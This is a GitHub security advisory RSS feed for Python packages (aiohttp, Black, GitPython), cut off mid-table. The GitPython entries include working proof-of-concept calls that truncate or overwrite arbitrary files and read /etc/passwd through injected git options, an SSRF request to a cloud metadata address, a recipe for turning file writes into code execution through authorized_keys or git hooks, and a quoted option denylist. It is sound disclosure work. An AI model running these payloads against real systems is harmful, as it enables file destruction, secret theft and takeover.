<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-08-03T20:53:12.703Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP: Out-of-bounds heap read in C HTTP response parser error path (malformed chunked response)]]></title>
        <id>https://github.com/advisories/GHSA-cq5v-8q36-5273</id>
        <link href="https://github.com/advisories/GHSA-cq5v-8q36-5273"/>
        <updated>2026-08-03T20:51:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An out-of-bounds heap read could occur in the C response parser while building an error message for a malformed response.</p>
<h3 id="impact">Impact</h3>
<p>An attacker controlled server, or possibly an accidental response could trigger a DoS in the client.</p>
<h3 id="workaround">Workaround</h3>
<p>If unable to upgrade, the Python parser is unaffected and can be used with <code>AIOHTTP_NO_EXTENSIONS=1</code>.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d">https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-cq5v-8q36-5273">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-cq5v-8q36-5273</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/13223">https://github.com/aio-libs/aiohttp/pull/13223</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d">https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.3">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.3</a></li>
<li><a href="https://github.com/advisories/GHSA-cq5v-8q36-5273">https://github.com/advisories/GHSA-cq5v-8q36-5273</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cq5v-8q36-5273</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T20:51:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP: HTTP request smuggling via WebSocket upgrade]]></title>
        <id>https://github.com/advisories/GHSA-mfx4-hv73-q22v</id>
        <link href="https://github.com/advisories/GHSA-mfx4-hv73-q22v"/>
        <updated>2026-08-03T20:47:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The HTTP parsers were vulnerable to a request smuggling attack relating to WebSocket upgrades.</p>
<h3 id="impact">Impact</h3>
<p>If using the server-side component, it may be possible for an attacker to execute a request smuggling vulnerability using an edge case in the WebSocket upgrade procedure. AIOHTT is unaware of any public exploit code.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98">https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mfx4-hv73-q22v">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mfx4-hv73-q22v</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/13017">https://github.com/aio-libs/aiohttp/pull/13017</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98">https://github.com/aio-libs/aiohttp/commit/6ae358f0983c3f4d6f67692b2f8e65dc8e091c98</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.2">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.2</a></li>
<li><a href="https://github.com/advisories/GHSA-mfx4-hv73-q22v">https://github.com/advisories/GHSA-mfx4-hv73-q22v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfx4-hv73-q22v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T20:46:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP: WebSocket client accepts compressed frames without negotiated permessage-deflate]]></title>
        <id>https://github.com/advisories/GHSA-mq44-7p77-q5h7</id>
        <link href="https://github.com/advisories/GHSA-mq44-7p77-q5h7"/>
        <updated>2026-08-03T20:40:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The client accepts and decompresses frames with the RSV1 bit set even when the <code>permessage-deflate</code> extension was not negotiated.</p>
<h3 id="impact">Impact</h3>
<p>A client may unexpectedly decompress WebSocket frames when explicitly opted out. This could lead to additional CPU/memory consumption, but is unlikely to be a significant issue unless a zip bomb vulnerability or similar is also present.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/47fb6ae354d4fa22048f4dbe7dbf82b625f0a2f6">https://github.com/aio-libs/aiohttp/commit/47fb6ae354d4fa22048f4dbe7dbf82b625f0a2f6</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mq44-7p77-q5h7">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mq44-7p77-q5h7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59881">https://nvd.nist.gov/vuln/detail/CVE-2026-59881</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/12978">https://github.com/aio-libs/aiohttp/pull/12978</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/47fb6ae354d4fa22048f4dbe7dbf82b625f0a2f6">https://github.com/aio-libs/aiohttp/commit/47fb6ae354d4fa22048f4dbe7dbf82b625f0a2f6</a></li>
<li><a href="http://github.com/aio-libs/aiohttp/releases/tag/v3.14.2">http://github.com/aio-libs/aiohttp/releases/tag/v3.14.2</a></li>
<li><a href="https://github.com/advisories/GHSA-mq44-7p77-q5h7">https://github.com/advisories/GHSA-mq44-7p77-q5h7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq44-7p77-q5h7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T20:40:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[black] Black: Arbitrary file writes from unsanitized user input in cache file name]]></title>
        <id>https://github.com/advisories/GHSA-3936-cmfr-pm3m</id>
        <link href="https://github.com/advisories/GHSA-3936-cmfr-pm3m"/>
        <updated>2026-08-03T20:35:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Black writes a cache file, the name of which is computed from various formatting options. The value of the <code>--python-cell-magics</code> option was placed in the filename without sanitization, which allowed an attacker who controls the value of this argument to write cache files to arbitrary file system locations. </p>
<h3 id="patches">Patches</h3>
<p>Fixed in Black 26.3.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not allow untrusted user input into the value of the <code>--python-cell-magics</code> option.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/psf/black/security/advisories/GHSA-3936-cmfr-pm3m">https://github.com/psf/black/security/advisories/GHSA-3936-cmfr-pm3m</a></li>
<li><a href="https://github.com/psf/black/pull/5038">https://github.com/psf/black/pull/5038</a></li>
<li><a href="https://github.com/psf/black/commit/4937fe6cf241139ddbfc16b0bdbb5b422798909d">https://github.com/psf/black/commit/4937fe6cf241139ddbfc16b0bdbb5b422798909d</a></li>
<li><a href="https://github.com/psf/black/releases/tag/26.3.1">https://github.com/psf/black/releases/tag/26.3.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32274">https://nvd.nist.gov/vuln/detail/CVE-2026-32274</a></li>
<li><a href="https://github.com/psf/black/pull/4176">https://github.com/psf/black/pull/4176</a></li>
<li><a href="https://github.com/psf/black/commit/ed770ba4dd50c419148a0fca2b43937a7447e1f9">https://github.com/psf/black/commit/ed770ba4dd50c419148a0fca2b43937a7447e1f9</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2026:10184">https://access.redhat.com/errata/RHSA-2026:10184</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2026:13545">https://access.redhat.com/errata/RHSA-2026:13545</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2026:13553">https://access.redhat.com/errata/RHSA-2026:13553</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-32274">https://access.redhat.com/security/cve/CVE-2026-32274</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2447111">https://bugzilla.redhat.com/show_bug.cgi?id=2447111</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2026-2121.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2026-2121.yaml</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-32274.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-32274.json</a></li>
<li><a href="https://github.com/advisories/GHSA-3936-cmfr-pm3m">https://github.com/advisories/GHSA-3936-cmfr-pm3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3936-cmfr-pm3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-12T18:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Arbitrary file truncation via git rev-list --output argument injection in unguarded Commit.count]]></title>
        <id>https://github.com/advisories/GHSA-p538-c434-8v24</id>
        <link href="https://github.com/advisories/GHSA-p538-c434-8v24"/>
        <updated>2026-08-03T20:23:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Commit.count()</code> forwards <code>**kwargs</code> into <code>rev_list</code> with <strong>no</strong> <code>check_unsafe_options</code> guard (the guard exists only in the sibling <code>iter_items</code>, commit.py:341). <code>git rev-list --output=&lt;path&gt;</code> opens and truncates the target file to 0 bytes before revision parsing, so <code>count(output='/victim')</code> destroys/blanks an arbitrary file.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>commit.py:290-291</code> calls <code>self.repo.git.rev_list(self.hexsha, **kwargs)</code> with no <code>check_unsafe_options</code> and no <code>allow_unsafe_options</code> parameter. The sibling <code>iter_items</code> (commit.py:341) is guarded; <code>count</code> is not. This is a distinct, uncovered sink — GHSA-956x-8gvw-wg5v fixed <code>iter_commits</code>/<code>blame</code>, not <code>count</code>.</p>
<h2 id="impact">Impact</h2>
<p>Destroy/blank an arbitrary file at process privilege (integrity/availability). Reachability is key-control only (<code>count</code> uses <code>self.hexsha</code>, not a user ref), and the write is a 0-byte truncation (no content control), so MEDIUM.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python">commit.count(output='/path/to/victim')   # victim truncated to 0 bytes (verified)
# control: commit.iter_commits(output=...) raises UnsafeOptionError
</code></pre>
<h2 id="attack-chain">Attack Chain</h2>
<ol>
<li>Entry: app forwards user options -&gt; <code>commit.count(output='/victim')</code>. Guard: none. Bypass proof: <code>iter_commits(output=)</code> raises UnsafeOptionError; <code>count(output=)</code> does not — verified side-by-side.</li>
<li>Sink: <code>git rev-list &lt;sha&gt; --output=/victim</code> -&gt; file truncated to 0 bytes. Impact: destroy/blank arbitrary file.</li>
</ol>
<h2 id="bypass-evidence">Bypass Evidence</h2>
<p>Live-verified on HEAD (tag 3.1.53): <code>count(output=&lt;victim&gt;)</code> truncated a pre-existing file to 0 bytes; guarded <code>iter_commits(output=)</code> raised UnsafeOptionError. Same CNA-accepted "app forwards user options dict" model as GHSA-956x-8gvw-wg5v's <code>archive(**kwargs)</code>. Uncovered sink, not a duplicate.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><code>&lt;= 3.1.53</code></p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add <code>check_unsafe_options</code> to <code>Commit.count</code> (mirroring <code>iter_items</code>).</p>
<hr>
<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-p538-c434-8v24">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-p538-c434-8v24</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2184">https://github.com/gitpython-developers/GitPython/pull/2184</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/38553b6fddc7f6a667cdb45a6762343a08fc72b2">https://github.com/gitpython-developers/GitPython/commit/38553b6fddc7f6a667cdb45a6762343a08fc72b2</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.56">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.56</a></li>
<li><a href="https://github.com/advisories/GHSA-p538-c434-8v24">https://github.com/advisories/GHSA-p538-c434-8v24</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p538-c434-8v24</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T20:23:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Incomplete unsafe_git_archive_options denylist omits --add-file / --add-virtual-file, enabling arbitrary file read via Repo.archive()]]></title>
        <id>https://github.com/advisories/GHSA-539m-9xh6-q6rr</id>
        <link href="https://github.com/advisories/GHSA-539m-9xh6-q6rr"/>
        <updated>2026-08-03T20:14:29.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Target:</strong> gitpython-developers/GitPython
<strong>Tested:</strong> HEAD <code>07e80555</code> (2026-07-25), latest release 3.1.55, <code>git version 2.50.1</code></p>
<h2 id="summary">Summary</h2>
<p><code>Repo.archive()</code> does call the option guard, so this is not a missing-guard report. The guard is present and working; the <strong>denylist it consults is incomplete</strong>.</p>
<pre><code class="language-python"># git/repo/base.py:169
unsafe_git_archive_options = [
    # Allows arbitrary command execution through the remote git-upload-archive command.
    "--exec",
    # Writes output to a caller-controlled filesystem path.
    "--output",
    "-o",
]
</code></pre>
<p>The comment on <code>--output</code> states the protected class in the project's own words: an option that lets the caller name <strong>a filesystem path</strong> is unsafe. <code>--output</code> is blocked because it <em>writes</em> to a caller-chosen path.</p>
<p><code>git archive</code> also accepts <code>--add-file=&lt;path&gt;</code> and <code>--add-virtual-file=&lt;path:content&gt;</code> (both present in current git; verified against <code>git version 2.50.1</code>). <code>--add-file</code> <em>reads</em> a caller-chosen path — including an absolute path outside the repository — and places the bytes into the archive the caller receives. Neither option is in the list, and no other layer references them:</p>
<pre><code>$ grep -rniE "add.file|add_file" git/
git/index/base.py:771:   R"""Add files from the working tree, ...      # unrelated docstring
</code></pre>
<p>Net effect: the guard blocks arbitrary file <strong>write</strong> at this sink while permitting arbitrary file <strong>read</strong> at the same sink.</p>
<h2 id="reachability-proof-verified-at-the-sink">Reachability proof (verified at the sink)</h2>
<p><code>poc/poc_addfile.py</code> at HEAD <code>07e80555</code>. The PoC creates its own out-of-tree canary, so it runs from a clean machine:</p>
<pre><code>-- CONTROL: options the denylist covers (expect BLOCKED) --
  [BLOCKED] output='/tmp/gp_written.tar': --output is not allowed, use `allow_unsafe_options=True` to allow it.
  [BLOCKED] o='/tmp/gp_written.tar': -o is not allowed, use `allow_unsafe_options=True` to allow it.
  [BLOCKED] exec='touch /tmp/gp_exec': --exec is not allowed, use `allow_unsafe_options=True` to allow it.

-- SIBLING OMITTED FROM THE DENYLIST: --add-file (expect ALLOWED) --
  [ALLOWED] add_file='/tmp/gp_canary.txt'  -&gt; archive 10240 bytes
  archive members: ['f.txt', 'gp_canary.txt']
  &gt;&gt;&gt; EXFILTRATED gp_canary.txt: 'secret-canary-12345'
  &gt;&gt;&gt; byte-for-byte match with the out-of-tree file: CONFIRMED

-- also: --add-virtual-file (attacker-chosen name AND content) --
  [ALLOWED] add_virtual_file='pwn.txt:hello'  -&gt; archive 10240 bytes
</code></pre>
<p>The three blocked lines are the control: they prove the guard is active on this call path, so the fourth result is a gap in list membership rather than a guard that never ran.</p>
<p>Minimal reproduction:</p>
<pre><code class="language-python">import io, tarfile
from git import Repo

buf = io.BytesIO()
Repo("/path/to/repo").archive(buf, format="tar", add_file="/etc/passwd")
print(tarfile.open(fileobj=io.BytesIO(buf.getvalue())).getnames())
# ['&lt;repo files&gt;', 'passwd']   &lt;- contents readable by whoever receives the archive
</code></pre>
<p>The canary is untracked and lives outside the repository; its contents are recovered from the returned archive and asserted byte-for-byte against the on-disk file. The option is rendered by <code>transform_kwargs</code> into <code>--add-file=&lt;path&gt;</code> and reaches <code>git archive</code> unmodified.</p>
<h2 id="direct-precedent">Direct precedent</h2>
<p><code>GHSA-6p8h-3wgx-97gf</code> (High, published 2026-07-22) is the same defect on the sibling list: <em>"Incomplete <code>unsafe_git_clone_options</code> denylist omits <code>--template</code>"</em> — an option absent from one of these denylists, reachable under the same caller-controlled-options precondition, accepted and fixed by adding it. <code>git log</code> shows the archive list itself has already been extended reactively once, in <code>701ce32f</code> (<em>fix: Guard unsafe git command options</em>, GHSA-956x-8gvw-wg5v), and the <code>--template</code> omission was then fixed separately in <code>ffcb5359</code>.</p>
<h2 id="--add-virtual-file-is-the-same-gap-pointing-the-other-way"><code>--add-virtual-file</code> is the same gap pointing the other way</h2>
<p><code>--add-virtual-file=&lt;path:content&gt;</code> lets the caller inject <strong>attacker-chosen content under an attacker-chosen name</strong> into an archive that downstream consumers will reasonably treat as repository-derived. </p>
<h2 id="suggested-remediation">Suggested remediation</h2>
<ol>
<li><strong>Preferred — allowlist.</strong> <code>Repo.archive()</code> has a small legitimate option surface (<code>format</code>, <code>prefix</code>, <code>worktree_attributes</code>, <code>remote</code>, compression level, plus paths). Accepting those and rejecting the rest means a future git release cannot add another path-taking option that silently reopens this.</li>
<li><strong>Minimum — extend the list</strong> with <code>--add-file</code> and <code>--add-virtual-file</code>, and make the membership rule <em>"the option takes a filesystem path or URL"</em> rather than <em>"the option executes a command"</em>. The existing comment on <code>--output</code> already implies that rule; applying it consistently is what closes the class instead of this instance.</li>
</ol>
<h2 id="scope-limits">Scope limits</h2>
<ul>
<li>Impact is <strong>arbitrary file read at the privileges of the process</strong>. Not code execution — I make no such claim here.</li>
<li>It requires the embedding application to forward caller-influenced kwargs into <code>Repo.archive()</code>. That is the identical precondition to <code>--output</code>, <code>--exec</code> and <code>--template</code>, all of which this project has treated as reportable.</li>
</ul>
<h2 id="disclosure">Disclosure</h2>
<h2 id="reported-privately-via-github-private-vulnerability-reporting-happy-to-test-a-candidate-patch-against-the-poc-no-public-disclosure-until-you-have-shipped-a-fix-and-are-ready">Reported privately via GitHub private vulnerability reporting. Happy to test a candidate patch against the PoC. No public disclosure until you have shipped a fix and are ready.</h2>
<h2 id="addendum-2026-07-25--related-observation-on-the-same-membership-question-filed-here-rather-than-separately">Addendum (2026-07-25) — related observation on the same membership question, filed here rather than separately</h2>
<p>While auditing the archive denylist, the same class of gap was identified in unsafe_git_clone_options. A second advisory is not being requested, as the issue is lower severity and should inform the fix for the issue above rather than require separate triage. Recording it here to provide the complete picture in one place.</p>
<p><code>Repo._clone()</code> treats a URL's protocol as a security boundary and applies <code>check_unsafe_protocols()</code> to exactly one input:</p>
<pre><code class="language-python">clone_url = Git.polish_url(url, expand_vars=False)
if not allow_unsafe_protocols:
    Git.check_unsafe_protocols(clone_url)      # the positional url only
</code></pre>
<p><code>git clone</code> accepts a <strong>second</strong> URL via <code>--bundle-uri=&lt;uri&gt;</code>, which git dereferences before the main transport runs. That option is absent from <code>unsafe_git_clone_options</code>, so the option guard passes it, and <code>check_unsafe_protocols()</code> never inspects it. A caller-influenced value therefore drives an outbound request from the host:</p>
<pre><code class="language-python">Repo.clone_from(trusted_url, dest,
                multi_options=["--bundle-uri=http://169.254.169.254/latest/meta-data/"])
# no UnsafeProtocolError, no UnsafeOptionError
</code></pre>
<p>Confirmed against a local listener — the request leaves the process:</p>
<pre><code>127.0.0.1 - - [24/Jul/2026 23:07:41] "GET /internal-metadata HTTP/1.1" 404 -
</code></pre>
<p><code>file:///path</code> is likewise accepted without error. Note this is <strong>not</strong> a tokenisation bypass: <code>multi_options</code> is <code>shlex.split</code> before the check (per <code>c9a26789</code> / GHSA-x2qx-6953-8485), so the fully-split <code>--bundle-uri=...</code> token is checked and legitimately passes because the option is not on the list.</p>
<p>Why it belongs with this report: both are the <em>membership</em> question rather than the matching logic — is the set of blocked options complete, and does the protocol guard inspect every URL git will dereference? The structural remediation proposed above covers both if extended slightly: prefer an allowlist per command, and route <strong>every</strong> URL-bearing option through <code>check_unsafe_protocols()</code>, not only the positional URL. Adding <code>--bundle-uri</code> to <code>unsafe_git_clone_options</code> would be the minimal fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-539m-9xh6-q6rr">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-539m-9xh6-q6rr</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2193">https://github.com/gitpython-developers/GitPython/pull/2193</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/7a4f5dcb7bf3cbcbf6e438017efcdfe0bc0d36ca">https://github.com/gitpython-developers/GitPython/commit/7a4f5dcb7bf3cbcbf6e438017efcdfe0bc0d36ca</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57</a></li>
<li><a href="https://github.com/advisories/GHSA-539m-9xh6-q6rr">https://github.com/advisories/GHSA-539m-9xh6-q6rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-539m-9xh6-q6rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T20:14:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Unguarded git option forwarding in IndexFile.checkout() and TagReference.create() enables arbitrary file overwrite and arbitrary file read]]></title>
        <id>https://github.com/advisories/GHSA-3f7w-8rr8-f37f</id>
        <link href="https://github.com/advisories/GHSA-3f7w-8rr8-f37f"/>
        <updated>2026-08-03T20:09:57.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Target:</strong> gitpython-developers/GitPython
<strong>Tested:</strong> HEAD <code>07e80555</code> (2026-07-25), latest release 3.1.55, <code>git version 2.50.1</code>
<strong>Reported instances:</strong> 2 exploitable, from a sweep of 14 unguarded call sites</p>
<h2 id="summary">Summary</h2>
<p>GitPython blocks dangerous git options through <code>Git.check_unsafe_options()</code>, gated per method by an <code>allow_unsafe_options</code> parameter. That guard is applied <strong>per call site</strong>, so any API that forwards <code>**kwargs</code> into a git command without calling it passes caller-controlled options straight to git.</p>
<p>A mechanical sweep of every method that forwards <code>**kwargs</code> into a <code>.git.&lt;command&gt;(...)</code> call found <strong>14 sites with no guard</strong>. Two reach a git option that takes a filesystem path:</p>
<table>
<thead>
<tr>
<th>#</th>
<th>Call site</th>
<th>git option</th>
<th>Impact</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><code>IndexFile.checkout()</code> → <code>git checkout-index</code></td>
<td><code>--prefix=&lt;path&gt;</code></td>
<td>arbitrary file <strong>overwrite</strong> with repository-controlled content</td>
</tr>
<tr>
<td>2</td>
<td><code>TagReference.create()</code> → <code>git tag</code></td>
<td><code>-F &lt;file&gt;</code> / <code>--file=&lt;file&gt;</code></td>
<td>arbitrary file <strong>read</strong>, returned in-band</td>
</tr>
</tbody></table>
<p>This is the same defect class already fixed in <code>Commit.count()</code> (GHSA-p538-c434-8v24), <code>Repo.archive()</code> and <code>Git.ls_remote()</code> (GHSA-956x-8gvw-wg5v). Both instances below are still present at HEAD.</p>
<hr>
<h2 id="instance-1--indexfilecheckout-arbitrary-file-overwrite">Instance 1 — <code>IndexFile.checkout()</code>: arbitrary file overwrite</h2>
<p><code>git/index/base.py:1210</code> accepts <code>**kwargs</code> and forwards them with no guard:</p>
<pre><code class="language-python">def checkout(self, paths=None, force=False, fprogress=lambda *args: None, **kwargs):
    ...
    proc = self.repo.git.checkout_index(*args, **kwargs)   # line 1331
    ...
    proc = self.repo.git.checkout_index(args, **kwargs)    # line 1349
</code></pre>
<p>There is no <code>allow_unsafe_options</code> parameter and no <code>check_unsafe_options()</code> call in the method.</p>
<p><code>git checkout-index</code> accepts <code>--prefix=&lt;string&gt;</code>, prepended to every output path. It is not confined to the working tree, so an absolute prefix writes tracked file contents anywhere the process can write, and <code>-f</code> overwrites what is already there.</p>
<h3 id="reproduction">Reproduction</h3>
<pre><code class="language-python">from git import Repo
Repo("/path/to/repo").index.checkout(prefix="/tmp/target_dir/", a=True, f=True)
</code></pre>
<p>Observed (<code>poc/poc_checkout_index.py</code>) — no exception raised, files land outside the repository:</p>
<pre><code>[ALLOWED] no UnsafeOptionError raised
files written outside the repo: ['f.txt']
  f.txt: 'hi\n'
</code></pre>
<p>Overwrite of a pre-existing file (<code>poc/poc_ci_overwrite.py</code>) — the victim file held <code>ORIGINAL-DO-NOT-CLOBBER\n</code> before the call:</p>
<pre><code>[ALLOWED] no exception
victim content now: 'hi\n'
OVERWRITTEN: True
</code></pre>
<h3 id="why-this-rates-high">Why this rates High</h3>
<p>Both halves of the write are attacker-influenced:</p>
<ul>
<li><strong>Destination</strong> — the <code>prefix</code> kwarg.</li>
<li><strong>Content</strong> — the bytes written are repository blobs, so anyone who can land a file in the repository (a pull-request branch, a mirrored or untrusted repository, an agent-cloned repository) controls exactly what is written.</li>
</ul>
<p>Commit a file named <code>authorized_keys</code>, <code>.bashrc</code>, <code>config</code> or <code>post-checkout</code>, choose the matching prefix (<code>~/.ssh/</code>, <code>~/</code>, <code>.git/hooks/</code>), and the write becomes code execution as the service account.</p>
<p>For comparison within this project: GHSA-fjr4-x663-mwxc (arbitrary file overwrite via <code>git diff --output</code>) is rated High, and GHSA-p538-c434-8v24 (arbitrary file <em>truncation</em> via <code>git rev-list --output</code>) is rated Medium. <code>--prefix</code> supplies full content control, so it sits at or above the former.</p>
<hr>
<h2 id="instance-2--tagreferencecreate-arbitrary-file-read">Instance 2 — <code>TagReference.create()</code>: arbitrary file read</h2>
<p><code>git/refs/tag.py:88</code> forwards <code>**kwargs</code> into <code>git tag</code> with no guard, and the signature advertises the passthrough:</p>
<pre><code class="language-python">def create(cls, repo, path, reference="HEAD", logmsg=None, force=False, **kwargs):
    """...
    :param kwargs:
        Additional keyword arguments to be passed to :manpage:`git-tag(1)`.
    """
</code></pre>
<p><code>git tag</code> accepts <code>-F &lt;file&gt;</code> / <code>--file=&lt;file&gt;</code>, which reads the tag message from an arbitrary path. The annotated tag object stores that content and GitPython returns it to the caller via <code>TagReference.tag.message</code>, so the file contents come back in-band.</p>
<h3 id="reproduction-1">Reproduction</h3>
<pre><code class="language-python">from git import Repo
from git.refs.tag import TagReference

t = TagReference.create(Repo("/path/to/repo"), "x", force=True, a=True, F="/etc/passwd")
print(t.tag.message)
</code></pre>
<p>Observed (<code>poc/poc_tag_F.py</code>), reading a canary file outside the repository:</p>
<pre><code>[ALLOWED] no UnsafeOptionError raised
&gt;&gt;&gt; tag message recovered from arbitrary path: 'TAG-READ-CANARY-98765\nsecond-line-secret'
</code></pre>
<p>Impact is a read at the privileges of the process. I am not claiming code execution for this instance. The signing options (<code>-s</code>, <code>-u</code>/<code>--local-user</code>) do invoke gpg from the same unguarded kwargs, but I did not develop that into command execution and make no claim about it.</p>
<hr>
<h2 id="sweep-results--the-other-12-sites">Sweep results — the other 12 sites</h2>
<p>Reported so the fix can be scoped once rather than per report. <code>poc/sweep.py</code> reproduces this list.</p>
<table>
<thead>
<tr>
<th>Call site</th>
<th>git command</th>
<th>Assessment</th>
</tr>
</thead>
<tbody><tr>
<td><code>IndexFile.from_tree()</code></td>
<td><code>read-tree</code></td>
<td><code>--index-output=&lt;path&gt;</code> looked reachable but is <strong>neutralised</strong>: GitPython appends its own <code>--index-output</code> after the caller's kwargs and git honours the last occurrence. Verified — victim file unchanged (<code>poc/poc_readtree.py</code>)</td>
</tr>
<tr>
<td><code>IndexFile.remove()</code></td>
<td><code>rm</code></td>
<td><code>--pathspec-from-file</code> only reads a pathspec; no write or disclosure primitive found</td>
</tr>
<tr>
<td><code>IndexFile.move()</code></td>
<td><code>mv</code></td>
<td>same</td>
</tr>
<tr>
<td><code>HEAD.reset()</code></td>
<td><code>reset</code></td>
<td>same</td>
</tr>
<tr>
<td><code>HEAD.checkout()</code></td>
<td><code>checkout</code></td>
<td>same</td>
</tr>
<tr>
<td><code>Head.delete()</code>, <code>RemoteReference.delete()</code></td>
<td><code>branch</code></td>
<td>no path-taking option found</td>
</tr>
<tr>
<td><code>Repo.merge_base()</code></td>
<td><code>merge-base</code></td>
<td>no path-taking option found</td>
</tr>
<tr>
<td><code>Repo._get_untracked_files()</code></td>
<td><code>status</code></td>
<td>no path-taking option found</td>
</tr>
<tr>
